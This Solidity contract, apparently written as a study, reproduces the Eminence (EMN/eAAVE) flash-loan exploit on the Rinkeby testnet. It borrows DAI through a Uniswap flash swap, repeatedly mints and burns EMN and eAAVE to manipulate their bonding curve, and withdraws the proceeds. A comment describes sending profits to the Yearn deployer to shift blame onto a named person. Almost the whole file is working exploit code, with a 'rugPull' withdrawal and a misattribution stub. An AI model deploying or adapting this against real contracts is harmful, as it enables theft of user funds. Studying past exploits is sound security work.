pragma solidity ^0.5.16;

import "./UniswapFlashSwapper.sol";
import "./SafeMath.sol";

// EMN interface signatures
contract EminenceCurrencyEMN {
  function addNPC(address _npc) external;
  function revokeNPC(address _npc) external;
  function addGM(address _gm) external;
  function revokeGM(address _gm) external;
  function award(address _to, uint _amount) external;
  function claim(address _from, uint _amount) external;
  function buy(uint _amount, uint _min) external returns (uint _bought);
  function sell(uint _amount, uint _min) external returns (uint _bought);
}

// eAAVE interface signatures
contract EminenceCurrencyEaave {
  function addNPC(address _npc) external;
  function revokeNPC(address _npc) external;
  function addGM(address _gm) external;
  function revokeGM(address _gm) external;
  function award(address _to, uint _amount) external;
  function claim(address _from, uint _amount) external;
  function buy(uint _amount, uint _min) external returns (uint _bought);
  function sell(uint _amount, uint _min) external returns (uint _bought);
}

contract EmnExploitStudy is UniswapFlashSwapper {

    using SafeMath for uint;
    address RINKEBY_DAI = address(0xc7AD46e0b8a400Bb3C915120d284AafbA8fc4735);
    IERC20 dai = IERC20(RINKEBY_DAI);

    function flashSwap() external {

        // initialise flash paramters
        address tokenBorrow = RINKEBY_DAI; // flash borrowing rinkeby DAI
        uint256 flashAmount = 10000000000000000000000; // the actual exploit involved flashing $15M worth of DAI but we're using 10k here for demo purposes
        address tokenPay = RINKEBY_DAI; // repaying flash swap with rinkeby DAI
        bytes memory userData = "";

        // execute flash swap and the atomic minting/burning of EMN/eAAVE in between
        // Note: in the actual exploit this was called 3 times within the same Tx
        startSwap(tokenBorrow, flashAmount, tokenPay, userData);
        startSwap(tokenBorrow, flashAmount, tokenPay, userData);
        startSwap(tokenBorrow, flashAmount, tokenPay, userData);

        // now that the flash loan has been repaid, clean up loose ends
        executePsyOps();
    }

    // Mid-flash swap logic i.e. what you do with the temporarily acquired flash liquidity
    function execute(address _tokenBorrow, uint _amount, address _tokenPay, uint _amountToRepay, bytes memory _userData) internal {

        // change the two addresses below with your own deployed EMN and eAAVE contracts
        address EmnAddress = address(0xbf17593c6B3Bf351cb8C33be6e753aF8eD41Fe01);
        address eAaveAddress = address(0xf9325bD4B7249fA70ce37fa8d80426a27675a49e);
        uint256 emnBuyAmount = 1000000000000000000;

        // instantiate the deployed EMN and eAAVE token contracts
        EminenceCurrencyEMN emn = EminenceCurrencyEMN(EmnAddress);
        EminenceCurrencyEaave eaave = EminenceCurrencyEaave(eAaveAddress);

        // approve EMN contract to use your DAI to mint EMN tokens
        dai.approve(EmnAddress, emnBuyAmount);

        // step 1 - use DAI to mint EMN
        uint emnBought = emn.buy(emnBuyAmount, 0);

        // step 2 - burn half your EMN to mint eAAVE
        uint emnBoughtHalf = emnBought.div(2);
        uint eaaveBought = eaave.buy(emnBoughtHalf, 0);

        // step 3 - convert the other half of your EMN back to dai
        emn.sell(emnBoughtHalf, 0);

        // step 4 - burn the eAAVE from step 2 to mint EMN
        uint emBoughtRemainder = eaave.sell(eaaveBought, 0);

        // step 5 - convert the EMN from step 4 into DAI
        emn.sell(emBoughtRemainder, 0);
    }

    // withdraw entire token balance
    function rugPull() external {

        dai.transfer(msg.sender, dai.balanceOf(address(this)));
    }

    // @notice Simple getter for convenience while testing
    function getBalanceOf(address _input) external view returns (uint) {
        if (_input == address(0)) {
            return address(this).balance;
        }
        return IERC20(_input).balanceOf(address(this));
    }

    // but IDK tho, might be psyops
    function executePsyOps() internal {
        // transfer half of post-loan repayment net profit to the 'Yearn: Deployer' contract to divert attention to Andre
    }

}
